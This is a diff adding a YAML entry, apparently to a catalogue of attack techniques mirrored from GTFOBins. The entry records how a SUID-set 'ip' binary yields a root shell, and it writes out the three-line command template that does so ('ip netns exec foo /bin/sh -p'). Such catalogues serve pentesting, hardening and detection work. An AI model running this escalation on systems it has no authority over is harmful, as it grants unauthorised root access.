@@ -1,0 +1,28 @@
+id: gtfobins/ip/shell/suid
+type: binary
+platform: linux
+name: ip
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'ip netns add foo
+
+    ip netns exec foo /bin/sh -p
+
+    ip netns delete foo'
+references:
+- https://gtfobins.github.io/gtfobins/ip/
+tags:
+- linux
+- unix
+- gtfobins
